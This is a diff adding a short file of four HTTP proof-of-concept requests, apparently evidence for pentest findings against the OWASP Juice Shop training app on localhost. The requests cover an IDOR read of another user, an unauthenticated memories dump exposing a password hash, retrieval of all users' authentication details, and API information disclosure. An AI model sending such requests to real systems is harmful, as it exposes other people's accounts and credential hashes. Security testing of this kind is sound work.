@@ -1,0 +1,19 @@
+=== REQUEST 1: IDOR - GET другого пользователя (F-004-A) ===
+GET /api/Users/1 HTTP/1.1
+Host: localhost:3000
+Authorization: Bearer <USER_TOKEN: bender@juice-sh.op, id=3>
+
+=== REQUEST 2: Unauthenticated Memory Dump with Password Hash (F-004-B) ===
+GET /rest/memories HTTP/1.1
+Host: localhost:3000
+(No Authorization)
+
+=== REQUEST 3: Broken Access Control - All User Authentication Details (F-004-C) ===
+GET /rest/user/authentication-details/ HTTP/1.1
+Host: localhost:3000
+Authorization: Bearer <USER_TOKEN: bender@juice-sh.op, id=3>
+
+=== REQUEST 4: API Information Disclosure (F-004-D) ===
+GET /api/Challenges/ HTTP/1.1
+Host: localhost:3000
+(No Authorization)
